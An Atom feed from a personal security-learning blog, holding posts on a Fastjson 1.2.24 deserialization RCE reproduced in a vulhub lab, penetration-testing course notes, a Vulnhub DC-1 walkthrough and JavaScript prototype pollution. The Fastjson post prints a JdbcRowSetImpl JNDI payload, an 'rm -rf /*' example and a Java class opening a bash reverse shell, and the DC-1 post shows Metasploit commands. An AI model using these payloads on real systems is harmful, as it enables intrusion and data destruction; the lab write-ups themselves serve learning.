<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Gu0f3n&#39;s blog</title>
  
  <subtitle>邮电部诗人</subtitle>
  <link href="https://gu0f3n.github.io/atom.xml" rel="self"/>
  
  <link href="https://gu0f3n.github.io/"/>
  <updated>2025-03-05T05:28:18.720Z</updated>
  <id>https://gu0f3n.github.io/</id>
  
  <author>
    <name>Gu0f3n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>“fastjson初探”</title>
    <link href="https://gu0f3n.github.io/2025/03/03/%E2%80%9Cfastjson%E5%88%9D%E6%8E%A2%E2%80%9D/"/>
    <id>https://gu0f3n.github.io/2025/03/03/%E2%80%9Cfastjson%E5%88%9D%E6%8E%A2%E2%80%9D/</id>
    <published>2025-03-03T12:02:19.000Z</published>
    <updated>2025-03-05T05:28:18.720Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Fastjson1-2-24-RCE漏洞"><a href="#Fastjson1-2-24-RCE漏洞" class="headerlink" title="Fastjson1.2.24-RCE漏洞"></a>Fastjson1.2.24-RCE漏洞</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>fastjson是阿里巴巴的开源JSON解析库，它可以解析JSON格式的字符串，支持将Java Bean序列化为JSON字符串，也可以从JSON字符串反序列化到JavaBean。即fastjson的主要功能就是将Java Bean序列化成JSON字符串，这样得到字符串之后就可以通过数据库等方式进行持久化了。</p><p> 漏洞原理 </p><p>再用Fastjson解析JSON数据的时候</p><p>假如攻击者伪造一段特殊的的恶意的JSON数据 </p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rmi://黑客仓库/危险物品&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这里面攻击者伪造了@type标签 需要用com.sun.rowset.JdbcRowSetImpl（指定反序列化类）进行处理 </p><p>这个jdbcRowSetlmpl 我们理解为分拣员 那么 分拣员记录下“需要联系黑客仓库的指令”</p><p>autoCommit”: true则会触发setAutoCommit()方法 相当于让jdbcRowSetlmpl立即执行</p><p>然后我们就进行恶意仓库的连接（JNDL注入）</p><p>分拣员（jdbcRowSetlmpl）就会根据rmi:&#x2F;&#x2F;黑客仓库&#x2F;危险物品地址拨打电话（发起JNDL请求）而黑客仓库（攻击者搭建二点RMI服务器）就会回应</p><p>“请到http:&#x2F;&#x2F;恶意站点&#x2F;Exploit.class领取包裹”</p><p><strong>加载“危险物品”（远程代码执行）</strong></p><p>快递公司系统（JVM）从恶意站点下载的Exploit.class并自动拆包执行其中的代码。例如：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Exploit.class 静态代码块</span></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">  Runtime.getRuntime().exec(<span class="string">&quot;rm -rf /*&quot;</span>); <span class="comment">// 删除服务器数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，攻击者通过一个伪造的包裹，成功劫持<img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1741005491298.jpg" alt="img">了整个快递</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>搭建环境就不演示了</p><p>首先在vulhubfastjson下面 创建一个test.java 内容如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">reverse</span>&#123;</span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">                        String[] commands = &#123;<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;bash -i &gt;&amp;  /dev/tcp/172.20.0.1/4563 0&gt;&amp;1&quot;</span>&#125;;</span><br><span class="line">                        <span class="type">Process</span> <span class="variable">pc</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">                        pc.waitFor();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="comment">// do nothing</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>目的就是把test.txt上传到目标主机 </p><p>然后进行编译 Javac reverse.java</p><p>然后我们在环境目录下起一个http服务 这一步部署rmi指定的文件下载服务器</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/007d447d-9ddc-4927-a3f5-1ce87e375326.png"></p><p>端口为5623</p><p>然后部署rmi服务器</p><p><a href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar</a></p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/de6ca6b9-8cda-4cb2-80a9-bec740601853.png"></p><p>端口为8520</p><p>接着去web页面抓包</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/5cff3b0f-4fe6-4187-ba58-5b3a37871df1.png"></p><p>发包前先nc -lvp 4563</p><p>发包发现成功反弹shell</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/223a33e5-0d7d-45da-9eb4-52096a2f9f52.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Fastjson1-2-24-RCE漏洞&quot;&gt;&lt;a href=&quot;#Fastjson1-2-24-RCE漏洞&quot; class=&quot;headerlink&quot; title=&quot;Fastjson1.2.24-RCE漏洞&quot;&gt;&lt;/a&gt;Fastjson1.2.24-RCE漏洞&lt;/h1&gt;&lt;</summary>
      
    
    
    
    
    <category term="fastjson" scheme="https://gu0f3n.github.io/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>跟着小迪的第二天</title>
    <link href="https://gu0f3n.github.io/2025/03/03/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%BA%8C%E5%A4%A9/"/>
    <id>https://gu0f3n.github.io/2025/03/03/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%9A%84%E7%AC%AC%E4%BA%8C%E5%A4%A9/</id>
    <published>2025-03-03T04:17:54.000Z</published>
    <updated>2025-03-05T05:28:18.722Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息打点"><a href="#信息打点" class="headerlink" title="信息打点"></a>信息打点</h1><p>1、打点-Web架构-语言&amp;中间件&amp;数据库&amp;系统等<br>2、打点-Web源码-CMS开源&amp;闭源售卖&amp;自主研发等<br>3、打点-Web源码获取-泄露安全&amp;资源监控&amp;其他等<br>4、打点-Web域名-子域名&amp;相似域名&amp;反查域名&amp;旁注等</p><p>区分windows 和Linux 可以用 大写小写来区分</p><p>windows上对文件的大小写不区分 </p><p>也可以通过ping网站来判断 一般 window de ttl&gt;100 Linux&lt;100</p><p>数据判断 搭建组合 端口扫描</p><p>#知识点：<br>1、CMS指纹识别源码获取方式<br>2、习惯&amp;配置&amp;特性等获取方式<br>3、托管资产平台资源搜索监控</p><p> 源码泄露</p><p>cms识别 云溪</p><p>管理员习惯不好 备份泄露</p><p>配置不当 git 泄露 |发布代码时候 没有将.git删除 直接同步上传道服务器其上</p><p> svn泄露 ds_Store泄露|同步发布道服务器上</p><p>php特性 composer.json 泄露 配置性说明性 文件 获得相关信息  </p><p>下载配合 WEB-INF泄露 必须要下载文件的漏洞 </p><p>GITHUB泄露 语法搜索&amp;管检测搜索</p><p>获取网络信息-服务厂商&amp;网络架构<br>获取服务信息-应用协议&amp;内网资产<br>获取阻碍信息-CDN&amp;WAF&amp;负载&amp;防火墙</p><p>内网资产查询  </p><p>旁注：同服务器下面的不同WEB应用查询技术<br>C段：同网段下面的不同服务器IP下的WEB应用查询技术</p><p>旁注查询 </p><p>c段查询 ip反查域名</p><p>cdn 查询 超级ping 去测试全国对其访问的速度来检测网站开通了cdn</p><p>网站waf  区分</p><p>超级ping：CDN服务识别<br>Masscan：端口扫描，应用协议<br>Wafw00f：Web应用防护防火墙识别<br>Nmap：端口扫描，应用协议，防火墙识别<br>lbd：负载均衡，广域网负载均衡，应用层负载均衡</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;信息打点&quot;&gt;&lt;a href=&quot;#信息打点&quot; class=&quot;headerlink&quot; title=&quot;信息打点&quot;&gt;&lt;/a&gt;信息打点&lt;/h1&gt;&lt;p&gt;1、打点-Web架构-语言&amp;amp;中间件&amp;amp;数据库&amp;amp;系统等&lt;br&gt;2、打点-Web源码-CMS开源&amp;amp;</summary>
      
    
    
    
    
    <category term="dixodi" scheme="https://gu0f3n.github.io/tags/dixodi/"/>
    
  </entry>
  
  <entry>
    <title>跟着小迪第一天</title>
    <link href="https://gu0f3n.github.io/2025/02/28/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%AC%AC%E4%B8%80%E5%A4%A9/"/>
    <id>https://gu0f3n.github.io/2025/02/28/%E8%B7%9F%E7%9D%80%E5%B0%8F%E8%BF%AA%E7%AC%AC%E4%B8%80%E5%A4%A9/</id>
    <published>2025-02-28T12:17:15.000Z</published>
    <updated>2025-03-05T05:28:18.723Z</updated>
    
    <content type="html"><![CDATA[<p>跟着小迪学习第一天</p><p>名词解释</p><p>POC：全称’ProofofConcept’，中文’概念验证’，常指一段漏洞证明的代码。<br>EXP：全称’Exploit’，中文利用，指利用系统漏洞进行攻击的动作。<br>Payload：中文有效载荷，指成功exploit之后，真正在目标系统执行的代码或指令。<br>Shellcode：简单翻译’shell代码’，是Payload的一种，由于其建立正向&#x2F;反向shell而得名。</p><p>网站搭建前置知识</p><p>域名 子域名 DNS http&#x2F;https 证书</p><p>web应用框架架构 </p><p>理解不同web应用组成校色功能框架 </p><p>开发语言，程序源码，中间件容器，数据库类型，服务器操作系统，第三方软件等<br>开发语言：asp,php,aspx,jsp,java,python,ruby,go,html,javascript等<br>程序源码：根据开发语言分类；应用类型分类；开源CMS分类；开发框架分类等<br>中间件容器：IIS,Apache,Nginx,Tomcat,Weblogic,Jboos,glasshfish等|支撑网站运行，各有不同的功能<br>数据库类型: Access,Mysql,Mssql,Oracle,db2,Sybase,Redis,MongoDB等|存储数据，根据不同需求，应用不同的数据库类型<br>服务器操作系统：Windows系列，Linux系列，Mac系列等|<br>第三方软件：phpmyadmin,vs-ftpd,VNC,ELK,Openssh等 </p><p>#WEB应用安全漏洞分类（程序源码）<br>SQL注入，文件安全，RCE执行，XSS跨站，CSRF&#x2F;SSRF&#x2F;CRLF，<br>反序列化，逻辑越权，未授权访问，XXE&#x2F;XML，弱口令安全等</p><p>web请求的过程 <a href="https://www.cnblogs.com/51benpao/p/12984951.html">https://www.cnblogs.com/51benpao/p/12984951.html</a> </p><p>浏览器输入域名-&gt;浏览器dns解析到ip地址-&gt;服务器和客户机建立tcp(三次握手)连接-&gt;浏览器通过http协议发送请求数据包-&gt;可能某些服务会做重定向来负载均衡-&gt;浏览器跟踪重定向地址重新开始连接过程-&gt;服务器处理请求-&gt;服务器发出html响应-&gt;释放tcp连接-&gt;浏览器显示页面（此时还没有完全接受到html全部的文档）-&gt;发送剩余的内容</p><p>web请求数据包<a href="https://www.cnblogs.com/rayray/p/3729533.html">https://www.cnblogs.com/rayray/p/3729533.html</a></p><p>学会不同对象采用不同抓包封包抓取技术分析</p><p>基于网络接口抓包-网络接口<br>基于程序进程抓包-程序进程<br>基于数据协议抓包-HTTP&#x2F;S&amp;TCP&amp;UDP<br>基于应用对象抓包-APP&amp;小程序&amp;PCUI<br>基于系统使用抓包-模拟器&amp;WIN&amp;LINUX</p><p>存储密码加密-Web&amp;数据库&amp;系统<br>传输数据编码-各类组合传输参数值<br>代码特性加密-JS&amp;PHP&amp;NET&amp;JAVA<br>数据显示编码-字符串数据显示编码</p><p> 详细点：<br>密码存储加密：<br>MD5 SHA1 NTLM AES DES RC4<br>MD5值是32或16位位由数”0-9”和字母”a-f”所组成的字符串<br>SHA1这种加密的密文特征跟MD5差不多，只不过位数是40<br>NTLM这种加密是Windows的哈希密码，标准通讯安全协议<br>AES，DES，RC4这些都是非对称性加密算法，引I入密钥，密文特征与Base64类似<br>应用场景：各类应用密文，自定义算法，代码分析，CTF安全比赛等</p><p>NTLM介绍 <a href="https://blog.csdn.net/qq_62169455/article/details/132617592">https://blog.csdn.net/qq_62169455/article/details/132617592</a></p><p>后端代码加密：<br>PHP .NET JAVA<br>PHP：乱码，头部有信息<br>.NET：DLL封装代码文件<br>JAVA:JAR&amp;CLASS文件<br>举例：Zend ILSpy IDEA<br>应用场景：版权代码加密，开发特性，CTE比赛等</p><p>编译和反编译 <a href="https://zhuanlan.zhihu.com/p/4766970">https://zhuanlan.zhihu.com/p/4766970</a> <a href="https://blog.csdn.net/weixin_44943389/article/details/132507440">https://blog.csdn.net/weixin_44943389/article/details/132507440</a></p><p>#知识点：<br>1、资产架构-端口目录插件接口多站点多应用<br>2、番外安全-域名c服务器本身服务厂商管理人员<br>3、考虑阻碍-站库分离&amp;CDN&amp;WAF&amp;负载均衡&amp;主机防护<br>详细点：<br>1、前置条件-购买使用-云服务器域名等<br>2、架构搭建-目录c端口子域c插件s应用等<br>3、安全部署-WAE防火墙&amp;主机防护&amp;HIDS等<br>4、性能优化-负载均衡&amp;CDN加速cOSS云存储等</p><p><strong>资产架构</strong>：<br>WEB单个源码指向安全 |<br>WEB多个目录源码安全 |可能会有多个程序，就有多个漏洞 扫描软7bscan<br>WEB多个端口源码安全 | nmap<br>服务器架设多个站点安全|<br>架设第三方插件接口安全|<br>服务器架设多个应用安全|<br>#番外安全：<br>基于域名解析安全 |<br>基于服务器本身安全<br>基于服务商信息安全<br>基于管理个人的安全<br>#考虑阻碍：<br>阻碍-站库分离|<br>阻碍-CDN加速服务|<a href="https://zhuanlan.zhihu.com/p/616462418">https://zhuanlan.zhihu.com/p/616462418</a><br>阻碍-负载均衡服务|<a href="https://www.sangfor.com.cn/knowledge/load-balancing|%E5%8F%AF%E8%83%BD%E8%8E%B7%E5%BE%97%E7%9A%84%E6%98%AF%E5%A4%87%E7%94%A8%E6%9C%BA%E7%9A%84%E6%9D%83%E9%99%90">https://www.sangfor.com.cn/knowledge/load-balancing|可能获得的是备用机的权限</a><br>阻碍-WAF应用防火墙|</p><p>阻碍-主机防护防火墙|服务器杀毒软件</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;跟着小迪学习第一天&lt;/p&gt;
&lt;p&gt;名词解释&lt;/p&gt;
&lt;p&gt;POC：全称’ProofofConcept’，中文’概念验证’，常指一段漏洞证明的代码。&lt;br&gt;EXP：全称’Exploit’，中文利用，指利用系统漏洞进行攻击的动作。&lt;br&gt;Payload：中文有效载荷，指成功ex</summary>
      
    
    
    
    
    <category term="xiaodisec" scheme="https://gu0f3n.github.io/tags/xiaodisec/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub DC-1</title>
    <link href="https://gu0f3n.github.io/2025/02/16/vulnhub-DC-1/"/>
    <id>https://gu0f3n.github.io/2025/02/16/vulnhub-DC-1/</id>
    <published>2025-02-16T09:28:03.000Z</published>
    <updated>2025-03-05T05:28:18.717Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:e7:49:b2, IPv4: 192.168.205.128</span><br><span class="line">WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied</span><br><span class="line">WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.205.1   00:50:56:c0:00:01       (Unknown)</span><br><span class="line">192.168.205.2   00:50:56:f7:4f:9c       (Unknown)</span><br><span class="line">192.168.205.129 00:0c:29:04:0c:de       (Unknown)</span><br><span class="line">192.168.205.254 00:50:56:e2:1c:01       (Unknown)</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 1.874 seconds (136.61 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure><p>发现192.168.205.129 是我们的靶机ip 开始信息搜集</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root㉿kali)-[/home/kali]</span><br><span class="line">└─# nmap -sS -sV -A -T4 -p- 192.168.205.129</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 04:26 EST</span><br><span class="line">Nmap scan report for 192.168.205.129</span><br><span class="line">Host is up (0.00043s latency).</span><br><span class="line">Not shown: 65531 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)</span><br><span class="line">|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)</span><br><span class="line">|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.2.22 ((Debian))</span><br><span class="line">| http-robots.txt: 36 disallowed entries (15 shown)</span><br><span class="line">| /includes/ /misc/ /modules/ /profiles/ /scripts/ </span><br><span class="line">| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt </span><br><span class="line">| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt </span><br><span class="line">|_/LICENSE.txt /MAINTAINERS.txt</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Debian)</span><br><span class="line">|_http-generator: Drupal 7 (http://drupal.org)</span><br><span class="line">|_http-title: Welcome to Drupal Site | Drupal Site</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100024  1          44174/udp6  status</span><br><span class="line">|   100024  1          46616/tcp   status</span><br><span class="line">|   100024  1          46812/udp   status</span><br><span class="line">|_  100024  1          46918/tcp6  status</span><br><span class="line">46616/tcp open  status  1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:04:0C:DE (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3</span><br><span class="line">OS details: Linux 3.2 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.43 ms 192.168.205.129</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.30 seconds</span><br></pre></td></tr></table></figure><p>得到22 80 111 三个端口</p><p>22是ssh 80是http服务 </p><p>首先进入web页面看一看有什么</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/20250216173216.png"></p><p>一个登录页面 拿一下网站的基本信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# whatweb -v 192.168.205.129</span><br><span class="line">WhatWeb report for http://192.168.205.129</span><br><span class="line">Status    : 200 OK</span><br><span class="line">Title     : Welcome to Drupal Site | Drupal Site</span><br><span class="line">IP        : 192.168.205.129</span><br><span class="line">Country   : RESERVED, ZZ</span><br><span class="line"></span><br><span class="line">Summary   : Apache[2.2.22], Content-Language[en], Drupal, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PasswordField[pass], PHP[5.4.45-0+deb7u14], Script[text/javascript], UncommonHeaders[x-generator], X-Powered-By[PHP/5.4.45-0+deb7u14]   </span><br><span class="line"></span><br><span class="line">Detected Plugins:</span><br><span class="line">[ Apache ]</span><br><span class="line">        The Apache HTTP Server Project is an effort to develop and </span><br><span class="line">        maintain an open-source HTTP server for modern operating </span><br><span class="line">        systems including UNIX and Windows NT. The goal of this </span><br><span class="line">        project is to provide a secure, efficient and extensible </span><br><span class="line">        server that provides HTTP services in sync with the current </span><br><span class="line">        HTTP standards. </span><br><span class="line"></span><br><span class="line">        Version      : 2.2.22 (from HTTP Server Header)</span><br><span class="line">        Google Dorks: (3)</span><br><span class="line">        Website     : http://httpd.apache.org/</span><br><span class="line"></span><br><span class="line">[ Content-Language ]</span><br><span class="line">        Detect the content-language setting from the HTTP header. </span><br><span class="line"></span><br><span class="line">        String       : en</span><br><span class="line"></span><br><span class="line">[ Drupal ]</span><br><span class="line">        Drupal is an opensource CMS written in PHP. </span><br><span class="line"></span><br><span class="line">        Aggressive function available (check plugin file or details).</span><br><span class="line">        Google Dorks: (1)</span><br><span class="line">        Website     : http://www.drupal.org</span><br><span class="line"></span><br><span class="line">[ HTTPServer ]</span><br><span class="line">        HTTP server header string. This plugin also attempts to </span><br><span class="line">        identify the operating system from the server header. </span><br><span class="line"></span><br><span class="line">        OS           : Debian Linux</span><br><span class="line">        String       : Apache/2.2.22 (Debian) (from server string)</span><br><span class="line"></span><br><span class="line">[ JQuery ]</span><br><span class="line">        A fast, concise, JavaScript that simplifies how to traverse </span><br><span class="line">        HTML documents, handle events, perform animations, and add </span><br><span class="line">        AJAX. </span><br><span class="line"></span><br><span class="line">        Website     : http://jquery.com/</span><br><span class="line"></span><br><span class="line">[ MetaGenerator ]</span><br><span class="line">        This plugin identifies meta generator tags and extracts its </span><br><span class="line">        value. </span><br><span class="line"></span><br><span class="line">        String       : Drupal 7 (http://drupal.org)</span><br><span class="line"></span><br><span class="line">[ PHP ]</span><br><span class="line">        PHP is a widely-used general-purpose scripting language </span><br><span class="line">        that is especially suited for Web development and can be </span><br><span class="line">        embedded into HTML. This plugin identifies PHP errors, </span><br><span class="line">        modules and versions and extracts the local file path and </span><br><span class="line">        username if present. </span><br><span class="line"></span><br><span class="line">        Version      : 5.4.45-0+deb7u14</span><br><span class="line">        Google Dorks: (2)</span><br><span class="line">        Website     : http://www.php.net/</span><br><span class="line"></span><br><span class="line">[ PasswordField ]</span><br><span class="line">        find password fields </span><br><span class="line"></span><br><span class="line">        String       : pass (from field name)</span><br><span class="line"></span><br><span class="line">[ Script ]</span><br><span class="line">        This plugin detects instances of script HTML elements and </span><br><span class="line">        returns the script language/type. </span><br><span class="line"></span><br><span class="line">        String       : text/javascript</span><br><span class="line"></span><br><span class="line">[ UncommonHeaders ]</span><br><span class="line">        Uncommon HTTP server headers. The blacklist includes all </span><br><span class="line">        the standard headers and many non standard but common ones. </span><br><span class="line">        Interesting but fairly common headers should have their own </span><br><span class="line">        plugins, eg. x-powered-by, server and x-aspnet-version. </span><br><span class="line">        Info about headers can be found at www.http-stats.com </span><br><span class="line"></span><br><span class="line">        String       : x-generator (from headers)</span><br><span class="line"></span><br><span class="line">[ X-Powered-By ]</span><br><span class="line">        X-Powered-By HTTP header </span><br><span class="line"></span><br><span class="line">        String       : PHP/5.4.45-0+deb7u14 (from x-powered-by string)</span><br><span class="line"></span><br><span class="line">HTTP Headers:</span><br><span class="line">        HTTP/1.1 200 OK</span><br><span class="line">        Date: Sat, 15 Feb 2025 23:03:39 GMT</span><br><span class="line">        Server: Apache/2.2.22 (Debian)</span><br><span class="line">        X-Powered-By: PHP/5.4.45-0+deb7u14</span><br><span class="line">        Expires: Sun, 19 Nov 1978 05:00:00 GMT</span><br><span class="line">        Last-Modified: Sat, 15 Feb 2025 23:03:39 +0000</span><br><span class="line">        Cache-Control: no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">        ETag: &quot;1739660619&quot;</span><br><span class="line">        Content-Language: en</span><br><span class="line">        X-Generator: Drupal 7 (http://drupal.org)</span><br><span class="line">        Vary: Accept-Encoding</span><br><span class="line">        Content-Encoding: gzip</span><br><span class="line">        Content-Length: 2276</span><br><span class="line">        Connection: close</span><br><span class="line">        Content-Type: text/html; charset=utf-8</span><br></pre></td></tr></table></figure><p>这里可以看到靶机的cms是Drupal</p><p>***启动Metersploit*****<em><strong>服务*</strong></em></p><p>搜寻drupal模块</p><p>使用序号一这个</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use 1</span><br><span class="line"></span><br><span class="line">set Rhost 192.168.29.131 *# s设置靶机ip*</span><br><span class="line"></span><br><span class="line">set lhost 192.168.29.128 *# 设置攻机ip*</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">run#</span><span class="language-bash">开始攻击</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;┌──(root㉿kali)-[/home/kali]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;</summary>
      
    
    
    
    <category term="vulnhub" scheme="https://gu0f3n.github.io/categories/vulnhub/"/>
    
    
    <category term="vulnhub" scheme="https://gu0f3n.github.io/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>nodejs 初探</title>
    <link href="https://gu0f3n.github.io/2024/11/25/nodejs-%E5%88%9D%E6%8E%A2/"/>
    <id>https://gu0f3n.github.io/2024/11/25/nodejs-%E5%88%9D%E6%8E%A2/</id>
    <published>2024-11-25T06:04:09.000Z</published>
    <updated>2024-11-25T06:04:34.736Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>js原型链污染初探</title>
    <link href="https://gu0f3n.github.io/2024/11/25/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%9D%E6%8E%A2/"/>
    <id>https://gu0f3n.github.io/2024/11/25/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%9D%E6%8E%A2/</id>
    <published>2024-11-25T02:36:10.000Z</published>
    <updated>2024-11-25T06:03:24.721Z</updated>
    
    <content type="html"><![CDATA[<p>Learn from:<a href="https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html">https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html</a></p><p>先放一张图</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1732502203084.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">js 是由对象组成的，对象与对象之间存在着继承关系</span><br><span class="line"></span><br><span class="line">每个对象都有一个指向它的原型的内部链接，而这个原型对象又有他自己的原型，直到 null 为止</span><br><span class="line"></span><br><span class="line">整体看来就是多个对象层层继承，实例对象的原型链接形成了一条链，也就是 js 的原型链</span><br><span class="line"></span><br><span class="line">在 js 中每个函数都有一个 prototype 属性，而每个对象中也有一个 **proto** 属性用来指向实例对象的原型</span><br><span class="line"></span><br><span class="line">而每个原型也都有一个 constructor 属性执行相关联的构造函数，我们就是通过构造函数生成实例化的对象</span><br></pre></td></tr></table></figure><p>由于对象之间存在继承关系，所以当我们要使用或者输出一个变量就会通过原型链向上搜索，当上层没有就会再向上上层搜索，直到指向 null，若此时还未找到就会返回 undefined</p><p>这幅图的原型链是 </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat-&gt;Cat.protype-&gt;Object.prototype-&gt;null</span><br></pre></td></tr></table></figure><p><strong>原型链污染通常出现在对象</strong>，<strong>数组的键名或者属性名可控</strong>，同时是赋值语句的情况下 ( 通常使用 json 传值 )</p><p>Learn form:<a href="https://pazuris.cn/2023/07/26/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://pazuris.cn/2023/07/26/NodeJs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p><p>师傅讲的很详细</p><p><strong>prototype和__proto__的区别</strong></p><p>在 JavaScript 中，每个对象都有一个 <code>__proto__</code> 属性，它指向该对象的原型。原型是一个对象，也可以有自己的原型，这样就形成了一个原型链。同时，每个函数也有一个 <code>prototype</code> 属性，它是一个对象，当该函数作为构造函数创建实例时，实例对象的 <code>__proto__</code> 属性会指向该构造函数的 <code>prototype</code> 属性，这样就可以实现属性和方法的继承。</p><p>区别在于：</p><ul><li><code>prototype</code>属性是函数所独有的，而<code>__proro__</code>属性是每个对象都有的（再强调一次，函数也是js对象）</li><li><code>prototype</code> 